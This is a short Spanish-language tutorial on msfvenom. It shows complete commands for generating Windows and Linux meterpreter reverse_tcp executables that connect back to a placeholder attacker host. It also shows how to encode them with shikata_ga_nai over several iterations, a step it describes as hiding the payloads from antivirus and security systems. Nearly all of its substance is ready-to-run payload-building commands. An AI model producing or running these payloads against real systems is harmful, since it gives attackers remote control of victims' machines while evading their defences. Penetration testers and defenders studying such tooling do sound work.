# Codificación de Cargas Útiles con `msfvenom`

## ¿Qué es la codificación de payloads?

Codificar un payload significa aplicar técnicas de ofuscación para evitar su detección por antivirus o sistemas de seguridad.  
No cambia su funcionalidad, solo su representación en binario.

Metasploit incluye varios encoders que transforman el código del payload para hacerlo más difícil de detectar.

---

## Listar encoders disponibles

```bash
msfvenom --list encoders
```

Algunos encoders comunes:
- `x86/shikata_ga_nai`: encoder polimórfico muy usado para Windows.
- `cmd/echo`, `cmd/generic_sh`, `x64/xor`: para otros entornos o arquitecturas.

---

## Codificar un payload para Windows

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PUERTO> -e x86/shikata_ga_nai -f exe > payload_win.exe
```

### Explicación:
- `-e x86/shikata_ga_nai`: selecciona el encoder.
- `-f exe`: formato de salida como ejecutable Windows.
- `>`: redirige el payload a un archivo.

---

## Aplicar múltiples iteraciones de codificación

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PUERTO> -e x86/shikata_ga_nai -i 10 -f exe > payload_encoded.exe
```

### Explicación adicional:
- `-i 10`: número de iteraciones del encoder (mayor número = más ofuscación).
- Más iteraciones pueden aumentar la evasión, pero también el tamaño y posibles fallos de ejecución.

---

## Codificar un payload para Linux

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PUERTO> -e x86/shikata_ga_nai -i 5 -f elf > payload_linux.elf
```

- Codifica un payload para Linux usando el mismo encoder (válido para x86).
- `-f elf`: formato de salida ELF, ejecutable estándar en Linux.



